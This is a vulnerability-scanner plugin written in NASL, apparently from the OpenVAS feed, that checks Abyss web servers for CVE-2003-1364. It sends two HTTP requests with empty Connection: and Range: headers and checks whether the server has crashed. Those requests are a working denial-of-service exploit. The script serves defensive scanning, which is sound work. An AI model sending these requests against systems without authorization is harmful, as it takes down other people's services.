# SPDX-FileCopyrightText: 2008 Renaud Deraison
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.80047");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2008-10-24 23:33:44 +0200 (Fri, 24 Oct 2008)");
  script_cve_id("CVE-2003-1364");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/7287");
  script_xref(name:"OSVDB", value:"2226");
  script_tag(name:"cvss_base", value:"8.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:P/A:C");
  script_name("Abyss httpd crash");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2008 Renaud Deraison");
  script_family("Denial of Service");
  script_dependencies("gb_abyss_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("abyss/installed");

  script_tag(name:"solution", value:"If the remote web server is Abyss X1, then upgrade to Abyss X1 v.1.1.4,
  otherwise inform your vendor of this flaw.");

  script_tag(name:"summary", value:"It was possible to kill the web server by sending empty HTTP fields (namely
  Connection: and Range:).");

  script_tag(name:"impact", value:"An attacker may use this flaw to prevent this host from performing its job properly.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

CPE = "cpe:/a:aprelium:abyss_web_server";

include("host_details.inc");
include("http_func.inc");

if(!port = get_app_port(cpe:CPE))
  exit(0);

if(!get_app_location(port:port, cpe:CPE, nofork:TRUE))
  exit(0);

if(http_is_dead(port:port))
  exit(0);

host = http_host_name(port:port);

req = string("GET / HTTP/1.0\r\n", "Host: ", host, "\r\n", "Connection: \r\n\r\n");
http_send_recv(port: port, data: req);

if(http_is_dead(port: port)) {
  security_message(port: port);
  exit(0);
}

req = string("GET / HTTP/1.0\r\n", "Host: ", host, "\r\n", "Range: \r\n\r\n");
http_send_recv(port: port, data: req);

if(http_is_dead(port: port)) {
  security_message(port: port);
  exit(0);
}

exit(99);
